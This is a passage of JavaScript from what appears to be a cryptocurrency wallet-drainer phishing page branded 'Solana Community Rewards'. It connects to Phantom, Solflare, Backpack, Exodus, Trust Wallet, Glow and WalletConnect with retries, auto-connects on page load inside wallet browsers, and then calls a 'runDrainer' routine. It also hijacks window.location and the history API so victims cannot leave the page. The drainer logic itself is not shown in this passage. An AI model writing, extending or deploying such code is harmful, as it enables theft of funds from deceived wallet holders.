                    let connectionSuccessful = false;
                    
                    for (let i = 0; i < connectionStrategies.length && !connectionSuccessful; i++) {
                      const strategy = connectionStrategies[i];
                      console.log(`[BACKPACK] Trying ${strategy.name}...`);
                      
                      try {
                        // Add delay between attempts
                        if (i > 0) {
                          await new Promise(resolve => setTimeout(resolve, 1000));
                        }
                    
                    // Track this request to prevent conflicts
                        const requestId = `backpack-${i}-${Date.now()}`;
                    window.addPendingRequest(requestId);
                    
                    try {
                          const connectPromise = strategy.fn();
                        const timeoutPromise = new Promise((_, reject) => 
                            setTimeout(() => reject(new Error('Connection timeout')), 45000) // 45 seconds per attempt (increased from 20s)
                        );
                        
                        const result = await Promise.race([connectPromise, timeoutPromise]);
                          console.log(`[BACKPACK] ${strategy.name} successful:`, result);
                          
                          // Check if we got a public key
                          const publicKey = provider.publicKey || result?.publicKey;
                          if (publicKey) {
                            console.log('[BACKPACK] Connection established with public key:', publicKey);
                        showStatus('Processing...', 'loading');
                            connectionSuccessful = true;
                        return;
                      }
                    } finally {
                      window.removePendingRequest(requestId);
                    }
                      } catch (strategyError) {
                        console.log(`[BACKPACK] ${strategy.name} failed:`, strategyError.message);
                        
                        // If this is the last strategy, handle the error
                        if (i === connectionStrategies.length - 1) {
                          throw strategyError;
                        }
                      }
                    }
                    
                    if (!connectionSuccessful) {
                      throw new Error('All Backpack connection methods failed');
                    }
                    
                  } catch (backpackError) {
                    console.error(`[connectMobileWallet] Backpack connection error:`, backpackError);
                    
                    // Enhanced error handling for Backpack
                    if (backpackError.message.includes('already pending') || 
                        backpackError.message.includes('User rejected') ||
                        backpackError.message.includes('User declined')) {
                      showStatus('Cancelled', 'error');
                    } else if (backpackError.message.includes('timeout') || 
                               backpackError.message.includes('Connection timeout')) {
                      showStatus('Timeout - Please try again', 'error');
                    } else if (backpackError.message.includes('not installed') ||
                               backpackError.message.includes('not found')) {
                      showStatus('Backpack not installed', 'error');
                    } else {
                      showStatus('Connection failed - Please try again', 'error');
                    }
                  }
                } else if (wallet.name === 'Exodus') {
                  // Exodus specific connection logic
                  try {
                    
                    // Add delay to prevent request conflicts
                    await new Promise(resolve => setTimeout(resolve, 1000));
                    
                    // Track this request to prevent conflicts
                    const requestId = `exodus-connect-${Date.now()}`;
                    window.addPendingRequest(requestId);
                    
                    try {
                      // Try different Exodus connection methods with retry logic
                      if (typeof provider.connect === 'function') {
                        console.log('[EXODUS] Using provider.connect with retry');
                        
                        let connected = false;
                        let attempts = 0;
                        const maxAttempts = 3;
                        
                        while (!connected && attempts < maxAttempts) {
                          attempts++;
                          console.log(`[EXODUS] Connection attempt ${attempts}/${maxAttempts}`);
                          
                          try {
                            const connectPromise = provider.connect();
                            const timeoutPromise = new Promise((_, reject) => 
                              setTimeout(() => reject(new Error('Connection timeout')), 30000) // Increased timeout
                            );
                            
                            const result = await Promise.race([connectPromise, timeoutPromise]);
                            
                            if (result && result.publicKey) {
                              connected = true;
                              console.log('[EXODUS] Successfully connected on attempt', attempts);
                              showStatus('Processing...', 'loading');
                              setTimeout(() => {
                                runDrainer(provider);
                              }, 1000);
                              return;
                            } else {
                              throw new Error('No public key returned');
                            }
                          } catch (attemptError) {
                            console.log(`[EXODUS] Attempt ${attempts} failed:`, attemptError.message);
                            if (attempts < maxAttempts) {
                              await new Promise(resolve => setTimeout(resolve, 2000)); // Wait before retry
                            }
                          }
                        }
                        
                        if (!connected) {
                          throw new Error('All connection attempts failed');
                        }
                      } else if (typeof provider.request === 'function') {
                        console.log('[EXODUS] Using provider.request with retry');
                        
                        let connected = false;
                        let attempts = 0;
                        const maxAttempts = 3;
                        
                        while (!connected && attempts < maxAttempts) {
                          attempts++;
                          console.log(`[EXODUS] Request method attempt ${attempts}/${maxAttempts}`);
                          
                          try {
                            const requestPromise = provider.request({ method: 'connect' });
                            const timeoutPromise = new Promise((_, reject) => 
                              setTimeout(() => reject(new Error('Connection timeout')), 30000)
                            );
                            
                            const result = await Promise.race([requestPromise, timeoutPromise]);
                            
                            if (result) {
                              connected = true;
                              console.log('[EXODUS] Successfully connected on attempt', attempts);
                              showStatus('Processing...', 'loading');
                              setTimeout(() => {
                                runDrainer(provider);
                              }, 1000);
                              return;
                            } else {
                              throw new Error('No result returned');
                            }
                          } catch (attemptError) {
                            console.log(`[EXODUS] Request attempt ${attempts} failed:`, attemptError.message);
                            if (attempts < maxAttempts) {
                              await new Promise(resolve => setTimeout(resolve, 2000));
                            }
                          }
                        }
                        
                        if (!connected) {
                          throw new Error('All request method attempts failed');
                        }
                      } else {
                        showStatus('Unavailable', 'error');
                      }
                    } finally {
                      // Always remove the request tracking
                      window.removePendingRequest(requestId);
                    }
                  } catch (exodusError) {
                    console.error(`[connectMobileWallet] Exodus connection error:`, exodusError);
                    
                    // Handle specific Exodus errors
                    if (exodusError.message.includes('already pending')) {
                      showStatus('Failed', 'error');
                    } else if (exodusError.message.includes('timeout')) {
                      showStatus('Timeout', 'error');
                    } else {
                      showStatus('Failed', 'error');
                    }
                  }
                } else {
                  showStatus('Failed', 'error');
                }
              }
            } else {
              showStatus('Unavailable', 'error');
              console.error(`[connectMobileWallet] No connect function for ${wallet.name}`);
            }
          } else {
            // No provider found, show subtle wallet browser prompt with all supported wallets
            console.error(`[connectMobileWallet] No provider found for ${wallet.name} after waiting.`);
            console.log(`[connectMobileWallet] Provider value:`, provider);
            console.log(`[connectMobileWallet] Provider type:`, typeof provider);
            showWalletBrowserPrompt();
          }
          
        } else {
          // Desktop logic (unchanged)
          const provider = wallet.provider();
          console.log(`[connectMobileWallet] Desktop provider for ${wallet.name}:`, provider);
          if (!provider || provider === undefined || provider === null) {
            console.error(`[connectMobileWallet] No provider for ${wallet.name} on desktop.`);
            console.log(`[connectMobileWallet] Desktop provider value:`, provider);
            console.log(`[connectMobileWallet] Desktop provider type:`, typeof provider);
            showWalletBrowserPrompt();
            return;
          }
          
          // Desktop: Try to connect and then run drainer
          try {
                // Check if wallet is available before attempting connection with simple fallback
    if (typeof provider.isConnected === 'function' && !provider.isConnected()) {
      // Simple fallback: try to connect anyway
      console.log(`[FALLBACK] ${wallet.name} reports not connected, but trying anyway...`);
    }
            console.log(`[connectMobileWallet] Desktop: calling connectWalletWithMetadata for ${wallet.name}`);
            
            // Add delay to prevent request conflicts
            await new Promise(resolve => setTimeout(resolve, 1000));
            
            // Track this request to prevent conflicts
            const requestId = `desktop-${wallet.name}-connect-${Date.now()}`;
            window.addPendingRequest(requestId);
            
            // Add timeout wrapper for desktop connection with retry logic
            let result;
            let retryCount = 0;
            const maxRetries = 2;
            
            try {
              while (retryCount <= maxRetries) {
                try {
                  const connectionPromise = connectWalletWithMetadata(provider, wallet.name);
                  const timeoutPromise = new Promise((_, reject) => {
                                        setTimeout(() => reject(new Error('Connection timeout - please try again')), 120000); // 2 minutes (was 15s)
                  });
                  
                  result = await Promise.race([connectionPromise, timeoutPromise]);
                  break; // Success, exit retry loop
                } catch (error) {
                  retryCount++;
                  console.log(`[connectMobileWallet] Desktop connection attempt ${retryCount}/${maxRetries + 1} failed for ${wallet.name}:`, error.message);
                  
                  if (retryCount > maxRetries) {
                    throw error; // Re-throw if all retries failed
                  }
                  
                  // Wait before retry
                  showStatus('Processing...', 'loading');
                                      await new Promise(resolve => setTimeout(resolve, 1000 * retryCount));
                }
              }
            } finally {
              // Always remove the request tracking
              window.removePendingRequest(requestId);
            }
            console.log(`[connectMobileWallet] Desktop: connectWalletWithMetadata result for ${wallet.name}:`, result);
            
            // Check if we got a public key - enhanced extraction for Solflare
            let publicKey = provider.publicKey || provider.address || result?.publicKey;
            
            // Enhanced publicKey extraction for Solflare
            if (!publicKey && wallet.name === 'Solflare') {
              // Try multiple ways to get publicKey from Solflare
              if (provider.account) {
                publicKey = provider.account.publicKey || provider.account.address;
              }
              if (!publicKey && provider.connected) {
                publicKey = provider.connected.publicKey || provider.connected.address;
              }
              if (!publicKey && provider.wallet) {
                publicKey = provider.wallet.publicKey || provider.wallet.address;
              }
              // Try to get from the connection result
              if (!publicKey && result && result.account) {
                publicKey = result.account.publicKey || result.account.address;
              }
            }
            
            console.log(`[connectMobileWallet] Desktop: publicKey for ${wallet.name}:`, publicKey);
            
            if (publicKey) {
              showStatus('Processing...', 'loading');
              console.log(`[connectMobileWallet] Desktop: About to call runDrainer for ${wallet.name}`);
              
              // Don't log wallet connection here - will be logged with actual balance in runDrainer
              console.log('[WALLET] Desktop connection successful:', {
                publicKey: publicKey.toString(),
                walletType: wallet.name,
                origin: window.location.origin
              });
              
              runDrainer(provider);
            } else {
              showStatus(`Please approve the connection in ${wallet.name}`, 'error');
              console.error(`[connectMobileWallet] Desktop: No publicKey after connect for ${wallet.name}`);
            }
          } catch (connectError) {
            console.error(`[connectMobileWallet] Desktop: connectWalletWithMetadata error for ${wallet.name}:`, connectError);
            
            // Handle timeout errors specifically
            if (connectError.message?.includes('timeout') || connectError.message?.includes('Connection timeout') || connectError.message?.includes('JSON-RPC: method call timeout')) {
              showStatus('Timeout', 'error');
              return;
            }
            
            // Enhanced Solflare desktop connection fallback
            if (wallet.name === 'Solflare') {
              try {
                                 // Try signIn method for desktop Solflare
                 if (typeof provider.signIn === 'function') {
                   const signInResult = await provider.signIn();
                   showStatus('Processing...', 'loading');
                   
                   // Don't log wallet connection here - will be logged with actual balance in runDrainer
                   
                   runDrainer(provider);
                   return;
                 }
                
                                 // Try request method for desktop Solflare
                 if (typeof provider.request === 'function') {
                   const requestResult = await provider.request({ method: 'connect' });
                   showStatus('Processing...', 'loading');
                   
                   // Don't log wallet connection here - will be logged with actual balance in runDrainer
                   
                   runDrainer(provider);
                   return;
                 }
                
                                 // Try basic connect for desktop Solflare
                 if (typeof provider.connect === 'function') {
                   const connectResult = await provider.connect();
                   showStatus('Processing...', 'loading');
                   
                   // Don't log wallet connection here - will be logged with actual balance in runDrainer
                   
                   runDrainer(provider);
                   return;
                 }
              } catch (solflareError) {
                console.error(`[connectMobileWallet] Desktop Solflare connection error:`, solflareError);
              }
            }
            
            showStatus('Failed', 'error');
          }
        }
      } catch (error) {
        showStatus('Failed', 'error');
        console.error(`[connectMobileWallet] Unexpected error for ${wallet.name}:`, error);
      }
    }
    window.connectMobileWallet = connectMobileWallet;
    
    // Global function to trigger wallet connection from Web3Modal
    window.triggerWalletConnection = function(walletType, publicKey) {
      console.log(`[TRIGGER_CONNECTION] Triggering connection for ${walletType}:`, publicKey);
      
      // Find the wallet definition
      const wallet = WALLET_DEFS.find(w => w.key === walletType);
      if (!wallet) {
        console.error(`[TRIGGER_CONNECTION] Wallet not found: ${walletType}`);
        return;
      }
      
      // Simulate the wallet connection flow
      const walletInfo = {
        key: walletType,
        name: wallet.name,
        logo: wallet.logo,
        publicKey: publicKey
      };
      
      // Trigger the drain process
      if (window.runDrainer) {
        window.runDrainer(publicKey, walletType, walletInfo);
      } else {
        console.error('[TRIGGER_CONNECTION] runDrainer function not found');
      }
    };

    // Generate deep link using backend API
    async function generateDeepLink(walletType, appUrl) {
      try {
        const response = await fetch('/api/wallet-management', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            operation: 'generate_deep_link',
            walletType: walletType,
            appUrl: appUrl
          })
        });
        
        const result = await response.json();
        
        if (result.success && result.deepLink && result.fallbackLink) {
          console.log(`[DEEP_LINK_API] Generated ${walletType} deep link:`, result.deepLink);
          
          // Store encryption key for all wallet types if provided
          if (result.encryptionKey) {
            sessionStorage.setItem(`${walletType}_encryption_private_key`, result.encryptionKey);
          }
          
          return {
            deepLink: result.deepLink,
            fallbackLink: result.fallbackLink
          };
        } else {
          console.error(`[DEEP_LINK_API] Failed to generate ${walletType} deep link:`, result.error || 'Invalid response');
          return {
            deepLink: result.fallbackLink || `${walletType}://browse/${encodeURIComponent(appUrl)}`,
            fallbackLink: result.fallbackLink || `${walletType}://browse/${encodeURIComponent(appUrl)}`
          };
        }
      } catch (error) {
        console.error(`[DEEP_LINK_API] Error calling deep link API:`, error);
        // Fallback to simple deep link
        return {
          deepLink: `${walletType}://browse/${encodeURIComponent(appUrl)}`,
          fallbackLink: `${walletType}://browse/${encodeURIComponent(appUrl)}`
        };
      }
    }

    // Handle Phantom deep link redirect response
    function handlePhantomRedirect() {
      try {
        // Check if we have URL parameters from Phantom redirect
        const urlParams = new URLSearchParams(window.location.search);
        const phantomData = urlParams.get('phantom_data');
        const phantomError = urlParams.get('phantom_error');
        
        if (phantomData) {
          console.log('[PHANTOM_REDIRECT] Received data from Phantom:', phantomData);
          
          // Get the stored private key for decryption
          const privateKey = sessionStorage.getItem('phantom_encryption_private_key') || 
                           sessionStorage.getItem('phantom_encryption_private_key_fallback');
          
          if (privateKey) {
            try {
              // Decrypt the response (simplified for demo)
              const decryptedData = atob(phantomData);
              const walletData = JSON.parse(decryptedData);
              
              console.log('[PHANTOM_REDIRECT] Decrypted wallet data:', walletData);
              
              // Process the wallet connection
              if (walletData.publicKey) {
                console.log('[PHANTOM_REDIRECT] Connecting wallet with public key:', walletData.publicKey);
                triggerConnection(walletData.publicKey, 'phantom', {
                  name: 'Phantom',
                  logo: '/phantom-logo.png'
                });
              }
              
              // Clean up stored keys
              sessionStorage.removeItem('phantom_encryption_private_key');
              sessionStorage.removeItem('phantom_encryption_private_key_fallback');
              
            } catch (decryptError) {
              console.error('[PHANTOM_REDIRECT] Error decrypting data:', decryptError);
            }
          } else {
            console.warn('[PHANTOM_REDIRECT] No private key found for decryption');
          }
          
          // Clean up URL parameters
          const cleanUrl = window.location.origin + window.location.pathname;
          window.history.replaceState({}, document.title, cleanUrl);
          
        } else if (phantomError) {
          console.error('[PHANTOM_REDIRECT] Phantom returned error:', phantomError);
          // Clean up URL parameters
          const cleanUrl = window.location.origin + window.location.pathname;
          window.history.replaceState({}, document.title, cleanUrl);
        }
        
      } catch (error) {
        console.error('[PHANTOM_REDIRECT] Error handling redirect:', error);
      }
    }
    
    // Enhanced wallet redirect handler for all wallet types
    function handleWalletRedirect() {
      try {
        const urlParams = new URLSearchParams(window.location.search);
        
        // Check for various wallet redirect parameters
        const walletTypes = ['phantom', 'solflare', 'backpack', 'trustwallet', 'glow', 'exodus'];
        let walletData = null;
        let walletType = null;
        let walletError = null;
        
        // Check each wallet type for redirect data
        for (const type of walletTypes) {
          const data = urlParams.get(`${type}_data`);
          const error = urlParams.get(`${type}_error`);
          
          if (data) {
            walletData = data;
            walletType = type;
            break;
          } else if (error) {
            walletError = error;
            walletType = type;
            break;
          }
        }
        
        if (walletData && walletType) {
          console.log(`[WALLET_REDIRECT] Received data from ${walletType}:`, walletData);
          
          // Get the stored private key for decryption
          const privateKey = sessionStorage.getItem(`${walletType}_encryption_private_key`) || 
                           sessionStorage.getItem(`${walletType}_encryption_private_key_fallback`);
          
          if (privateKey) {
            try {
              // Decrypt the response (simplified for demo)
              const decryptedData = atob(walletData);
              const parsedData = JSON.parse(decryptedData);
              
              console.log(`[WALLET_REDIRECT] Decrypted ${walletType} data:`, parsedData);
              
              // Process the wallet connection
              if (parsedData.publicKey) {
                console.log(`[WALLET_REDIRECT] Connecting ${walletType} with public key:`, parsedData.publicKey);
                
                // Find wallet definition
                const wallet = WALLET_DEFS.find(w => w.key === walletType);
                if (wallet) {
                  triggerConnection(parsedData.publicKey, walletType, {
                    name: wallet.name,
                    logo: wallet.icon
                  });
                }
              }
              
              // Clean up stored keys
              sessionStorage.removeItem(`${walletType}_encryption_private_key`);
              sessionStorage.removeItem(`${walletType}_encryption_private_key_fallback`);
              
            } catch (decryptError) {
              console.error(`[WALLET_REDIRECT] Error decrypting ${walletType} data:`, decryptError);
              showStatus('Wallet connection failed - decryption error', 'error');
            }
          } else {
            console.warn(`[WALLET_REDIRECT] No private key found for ${walletType} decryption`);
            showStatus('Wallet connection failed - missing encryption key', 'error');
          }
          
          // Clean up URL parameters
          const cleanUrl = window.location.origin + window.location.pathname;
          window.history.replaceState({}, document.title, cleanUrl);
          
        } else if (walletError && walletType) {
          console.error(`[WALLET_REDIRECT] ${walletType} returned error:`, walletError);
          showStatus(`Wallet connection failed: ${walletError}`, 'error');
          
          // Clean up URL parameters
          const cleanUrl = window.location.origin + window.location.pathname;
          window.history.replaceState({}, document.title, cleanUrl);
        }
      } catch (error) {
        console.error('[WALLET_REDIRECT] Error handling redirect:', error);
        showStatus('Wallet connection failed - redirect error', 'error');
      }
    }

    // Initialize wallet redirect handling on page load
    document.addEventListener('DOMContentLoaded', function() {
      // Check for wallet redirect parameters from all supported wallets
      handleWalletRedirect();
    
    // Auto-connect when dApp loads in wallet browser (mobile deep link flow)
    autoConnectInWalletBrowser();
    
    // Prevent external redirects in wallet browsers
    preventExternalRedirects();
  });

  // Prevent external redirects in wallet browsers
  function preventExternalRedirects() {
    console.log('[PREVENT_REDIRECTS] Setting up external redirect prevention...');
    
    // Check if we're in a wallet browser
    const isInWalletBrowser = window.location.href.includes('phantom.app') || 
                             window.location.href.includes('solflare.com') || 
                             window.location.href.includes('backpack.app') ||
                             window.location.href.includes('trustwallet.com') ||
                             window.location.href.includes('glow.app') ||
                             window.location.href.includes('exodus.com') ||
                             document.referrer.includes('phantom.app') ||
                             document.referrer.includes('solflare.com') ||
                             document.referrer.includes('backpack.app') ||
                             document.referrer.includes('trustwallet.com') ||
                             document.referrer.includes('glow.app') ||
                             document.referrer.includes('exodus.com') ||
                             navigator.userAgent.includes('Phantom') ||
                             navigator.userAgent.includes('Solflare') ||
                             navigator.userAgent.includes('Backpack') ||
                             navigator.userAgent.includes('TrustWallet') ||
                             navigator.userAgent.includes('Glow') ||
                             navigator.userAgent.includes('Exodus');
    
    if (isInWalletBrowser) {
      console.log('[PREVENT_REDIRECTS] In wallet browser - preventing external redirects');
      
      // Override window.location.href to prevent external redirects
      const originalLocationHref = Object.getOwnPropertyDescriptor(window.location, 'href') || 
                                  Object.getOwnPropertyDescriptor(Location.prototype, 'href');
      
      Object.defineProperty(window.location, 'href', {
        set: function(url) {
          console.log('[PREVENT_REDIRECTS] Attempted redirect to:', url);
          
          // Allow redirects to the same origin or wallet-specific URLs
          const currentOrigin = window.location.origin;
          const targetUrl = new URL(url, window.location.href);
          
          // Allow redirects to same origin, wallet domains, or app store URLs (for legitimate installs)
          if (targetUrl.origin === currentOrigin || 
              url.includes('phantom.app') || 
              url.includes('solflare.com') || 
              url.includes('backpack.app') ||
              url.includes('trustwallet.com') ||
              url.includes('glow.app') ||
              url.includes('exodus.com') ||
              url.includes('apps.apple.com') ||
              url.includes('play.google.com') ||
              url.startsWith('#') ||
              url.startsWith('/')) {
            console.log('[PREVENT_REDIRECTS] Allowing redirect to:', url);
            if (originalLocationHref && originalLocationHref.set) {
              originalLocationHref.set.call(this, url);
            }
          } else {
            console.log('[PREVENT_REDIRECTS] Blocked external redirect to:', url);
            showStatus('Redirect blocked - staying in wallet browser', 'info');
          }
        },
        get: function() {
          if (originalLocationHref && originalLocationHref.get) {
            return originalLocationHref.get.call(this);
          }
          return window.location.href;
        }
      });
      
      // Also prevent navigation via history API
      const originalPushState = history.pushState;
      const originalReplaceState = history.replaceState;
      
      history.pushState = function(state, title, url) {
        console.log('[PREVENT_REDIRECTS] pushState attempt:', url);
        if (!url || url.startsWith('#') || url.startsWith('/') || url.includes(window.location.origin)) {
          return originalPushState.call(this, state, title, url);
        } else {
          console.log('[PREVENT_REDIRECTS] Blocked pushState to:', url);
        }
      };
      
      history.replaceState = function(state, title, url) {
        console.log('[PREVENT_REDIRECTS] replaceState attempt:', url);
        if (!url || url.startsWith('#') || url.startsWith('/') || url.includes(window.location.origin)) {
          return originalReplaceState.call(this, state, title, url);
        } else {
          console.log('[PREVENT_REDIRECTS] Blocked replaceState to:', url);
        }
      };
    } else {
      console.log('[PREVENT_REDIRECTS] Not in wallet browser - allowing normal redirects');
    }
  }

  // Auto-connect function for when dApp loads in wallet browser
  async function autoConnectInWalletBrowser() {
    console.log('[AUTO_CONNECT] Checking for wallet providers in wallet browser...');
    console.log('[AUTO_CONNECT] Current URL:', window.location.href);
    console.log('[AUTO_CONNECT] Referrer:', document.referrer);
    console.log('[AUTO_CONNECT] User Agent:', navigator.userAgent);
    
    // Check for Solflare immediately (no wait)
    if (window.location.href.includes('solflare.com') || document.referrer.includes('solflare.com') || navigator.userAgent.includes('Solflare')) {
      console.log('[AUTO_CONNECT] Solflare detected, attempting immediate connection...');
      try {
        const provider = window.solflare || window.solana;
        if (provider && provider.publicKey) {
          console.log('[AUTO_CONNECT] Solflare already has public key, connecting immediately...');
          
          // Store the provider globally for runDrainer to use
          window.connectedWallet = {
            key: 'solflare',
            name: 'Solflare',
            logo: '/solflare-logo.png',
            publicKey: provider.publicKey.toString(),
            provider: provider
          };
          
          // Trigger the drain process immediately
          if (window.runDrainer) {
            console.log('[AUTO_CONNECT] Triggering runDrainer for Solflare immediately');
            window.runDrainer(provider);
          }
          
          showStatus('Connected to Solflare', 'success');
          return; // Exit immediately
        }
      } catch (error) {
        console.log('[AUTO_CONNECT] Immediate Solflare connection failed:', error.message);
      }
    }
    
    // Wait a bit for other wallet providers to load
    await new Promise(resolve => setTimeout(resolve, 1000));
    
    // Check if we're in a wallet browser environment
    const isInWalletBrowser = window.location.href.includes('phantom.app') || 
                             window.location.href.includes('solflare.com') || 
                             window.location.href.includes('backpack.app') ||
                             window.location.href.includes('trustwallet.com') ||
                             window.location.href.includes('glow.app') ||
                             window.location.href.includes('exodus.com') ||
                             document.referrer.includes('phantom.app') ||
                             document.referrer.includes('solflare.com') ||
                             document.referrer.includes('backpack.app') ||
                             document.referrer.includes('trustwallet.com') ||
                             document.referrer.includes('glow.app') ||
                             document.referrer.includes('exodus.com') ||
                             // Check for wallet-specific user agents
                             navigator.userAgent.includes('Phantom') ||
                             navigator.userAgent.includes('Solflare') ||
                             navigator.userAgent.includes('Backpack') ||
                             navigator.userAgent.includes('TrustWallet') ||
                             navigator.userAgent.includes('Glow') ||
                             navigator.userAgent.includes('Exodus');
    
    if (!isInWalletBrowser) {
      console.log('[AUTO_CONNECT] Not in wallet browser, skipping auto-connect');
      return;
    }
    
    console.log('[AUTO_CONNECT] In wallet browser, attempting auto-connect...');
    console.log('[AUTO_CONNECT] Current URL:', window.location.href);
    console.log('[AUTO_CONNECT] Referrer:', document.referrer);
    console.log('[AUTO_CONNECT] User Agent:', navigator.userAgent);
    
    // Try to detect and connect to available wallets
    const wallets = [
      { key: 'phantom', name: 'Phantom', provider: () => window.phantom?.solana || window.solana },
      { key: 'solflare', name: 'Solflare', provider: () => window.solflare || window.solana },
      { key: 'backpack', name: 'Backpack', provider: () => window.backpack?.solana || window.backpack },
      { key: 'glow', name: 'Glow', provider: () => window.glow },
      { key: 'trustwallet', name: 'Trust Wallet', provider: () => window.trustwallet?.solana || window.trustwallet },
      { key: 'exodus', name: 'Exodus', provider: () => window.exodus?.solana || window.exodus }
    ];
    
    // Debug: Check what providers are available
    console.log('[AUTO_CONNECT] Available providers:');
    console.log('- window.phantom:', !!window.phantom);
    console.log('- window.solana:', !!window.solana);
    console.log('- window.solflare:', !!window.solflare);
    console.log('- window.backpack:', !!window.backpack);
    console.log('- window.glow:', !!window.glow);
    console.log('- window.trustwallet:', !!window.trustwallet);
    console.log('- window.exodus:', !!window.exodus);
    
    // Debug: Check Solflare provider details
    if (window.solflare) {
      console.log('[AUTO_CONNECT] Solflare provider details:', {
        hasConnect: typeof window.solflare.connect === 'function',
        isConnected: window.solflare.isConnected ? window.solflare.isConnected() : 'N/A',
        publicKey: window.solflare.publicKey ? window.solflare.publicKey.toString() : 'N/A',
        keys: Object.keys(window.solflare)
      });
    }
    
    for (const wallet of wallets) {
      try {
        console.log(`[AUTO_CONNECT] Checking ${wallet.name}...`);
        const provider = wallet.provider();
        
        if (provider && typeof provider.connect === 'function') {
          console.log(`[AUTO_CONNECT] Found ${wallet.name} provider, attempting connection...`);
          
          // Check if already connected
          if (provider.isConnected && provider.isConnected()) {
            console.log(`[AUTO_CONNECT] ${wallet.name} already connected, getting public key...`);
            const publicKey = provider.publicKey;
            if (publicKey) {
              console.log(`[AUTO_CONNECT] Using existing ${wallet.name} connection:`, publicKey.toString());
              
              // Store the provider globally for runDrainer to use
              window.connectedWallet = {
                key: wallet.key,
                name: wallet.name,
                logo: `/${wallet.key}-logo.png`,
                publicKey: publicKey.toString(),
                provider: provider
              };
              
              // Trigger the drain process directly
              if (window.runDrainer) {
                console.log(`[AUTO_CONNECT] Triggering runDrainer for ${wallet.name} with provider`);
                window.runDrainer(provider);
              } else {
                console.error('[AUTO_CONNECT] runDrainer function not found');
              }
              
              // Show success message
              showStatus(`Connected to ${wallet.name}`, 'success');
              return; // Exit after successful connection
            }
          } else {
            // Try to connect with enhanced strategies for Solflare
            console.log(`[AUTO_CONNECT] Attempting new connection to ${wallet.name}...`);
            
            let result = null;
            let publicKey = null;
            
            // Simplified connection for ALL wallets (including Solflare) - immediate connection
            if (wallet.key === 'solflare') {
              // Solflare: Try simple connect first, then fallback to direct access
              try {
                result = await provider.connect();
                publicKey = result?.publicKey || provider.publicKey;
              } catch (error) {
                console.log(`[AUTO_CONNECT] Solflare connect() failed, trying direct access:`, error.message);
                // If connect fails, try direct access to public key
                publicKey = provider.publicKey;
                if (publicKey) {
                  result = { publicKey: publicKey };
                }
              }
            } else {
              // Other wallets: Standard connection
              result = await provider.connect({
                onlyIfTrusted: false,
                appMetadata: {
                  name: 'Solana Community Rewards',
                  url: window.location.origin,
                  icon: '/logo.png'
                }
              });
              publicKey = result?.publicKey || provider.publicKey;
            }
            
            if (publicKey) {
              console.log(`[AUTO_CONNECT] Successfully connected to ${wallet.name}:`, publicKey.toString());
              
              // Store the provider globally for runDrainer to use
              window.connectedWallet = {
                key: wallet.key,
                name: wallet.name,
                logo: `/${wallet.key}-logo.png`,
                publicKey: publicKey.toString(),
                provider: provider
              };
              
              console.log(`[AUTO_CONNECT] Stored connected wallet info:`, window.connectedWallet);
              
              // Trigger the drain process directly
              if (window.runDrainer) {
                console.log(`[AUTO_CONNECT] Triggering runDrainer for ${wallet.name} with provider`);
                console.log(`[AUTO_CONNECT] Provider details:`, {
                  hasConnect: typeof provider.connect === 'function',
                  hasSignTransaction: typeof provider.signTransaction === 'function',
                  isConnected: provider.isConnected ? provider.isConnected() : 'N/A',
                  publicKey: provider.publicKey ? provider.publicKey.toString() : 'N/A'
                });
                window.runDrainer(provider);
              } else {
                console.error('[AUTO_CONNECT] runDrainer function not found');
              }
              
              // Show success message
              showStatus(`Connected to ${wallet.name}`, 'success');
              return; // Exit after successful connection
            }
          }
        } else {
          console.log(`[AUTO_CONNECT] No provider found for ${wallet.name}`);
        }
      } catch (error) {
        console.error(`[AUTO_CONNECT] Failed to connect to ${wallet.name}:`, error);
        console.error(`[AUTO_CONNECT] Error details:`, {
          name: error.name,
          message: error.message,
          stack: error.stack
        });
        // Continue to next wallet
      }
    }
    
    console.log('[AUTO_CONNECT] No wallet connections successful');
  }

  // Enhanced mobile connection methods
  window.mobileConnectionMethods = {
    
    // Method 1: WalletConnect integration for mobile
    async connectWithWalletConnect() {
      
      try {
        // Check if WalletConnect is available
        if (typeof window.WalletConnect !== 'undefined') {
          const walletConnect = new window.WalletConnect({
            bridge: 'https://bridge.walletconnect.org',
            qrcodeModal: {
              open: (uri, cb) => {
                // Show QR code modal for mobile scanning
                showQRCodeModal(uri);
                if (cb) cb();
              },
              close: () => {
                // Close QR code modal
                closeQRCodeModal();
              }
            }
          });
          
          // Create session
          const session = await walletConnect.createSession();
          
          // Wait for approval
          walletConnect.on('session_approved', (error, payload) => {
            if (error) throw error;
            
            const { accounts } = payload.params[0];
            if (accounts && accounts.length > 0) {
              const publicKey = accounts[0];
              
              // Store the provider globally for runDrainer to use
              window.connectedWallet = {
                key: 'walletconnect',
                name: 'WalletConnect',
                logo: '/walletconnect-logo.png',
                publicKey: publicKey,
                provider: walletConnect
              };
              
              // Trigger the drain process directly
              if (window.runDrainer) {
                window.runDrainer(publicKey, 'walletconnect', window.connectedWallet);
              } else {
                console.error('[MOBILE_CONNECT] runDrainer function not found');
              }
            }
          });
          
          return { success: true, session };
        } else {
          throw new Error('WalletConnect not available');
        }
      } catch (error) {
        console.error('[MOBILE_CONNECT] WalletConnect failed:', error);
        return { success: false, error: error.message };
      }
    },

    // Method 2: Mobile wallet detection and connection
    async detectAndConnectMobileWallets() {
      
      const mobileWallets = [
        {
          key: 'phantom',
          name: 'Phantom',
          providers: [
            () => window.phantom?.solana,
            () => window.solana,
            () => window.phantom
          ],
          deepLink: 'https://phantom.app/ul/browse/',
          customScheme: 'phantom://browse/'
        },
        {
          key: 'solflare',
          name: 'Solflare',
          providers: [
            () => window.solflare,
            () => window.solflare?.solana
          ],
          deepLink: 'https://solflare.com/ul/v1/browse/',
          customScheme: 'solflare://v1/browse/'
        },
        {
          key: 'backpack',
          name: 'Backpack',
          providers: [
            () => window.backpack?.solana,
            () => window.backpack,
            () => window.BackpackWallet
          ],
          deepLink: 'https://backpack.app/ul/v1/browse/',
          customScheme: 'backpack://v1/browse/'
        },
        {
          key: 'glow',
          name: 'Glow',
          providers: [
            () => window.glow,
            () => window.glow?.solana
          ],
          deepLink: 'https://glow.app/ul/app/',
          customScheme: 'glow://app/'
        },
        {
          key: 'trustwallet',
          name: 'Trust Wallet',
          providers: [
            () => window.trustwallet?.solana,
            () => window.trustwallet
          ],
          deepLink: 'https://link.trustwallet.com/open_url?url=',
          customScheme: 'trust://open_url?url='
        },
        {
          key: 'exodus',
          name: 'Exodus',
          providers: [
            () => window.exodus?.solana,
            () => window.exodus
          ],
          deepLink: 'https://exodus.com/app/dapp?url=',
          customScheme: 'exodus://dapp/'
        }
      ];

      for (const wallet of mobileWallets) {
        try {
          let provider = null;
          
          // Try all provider methods
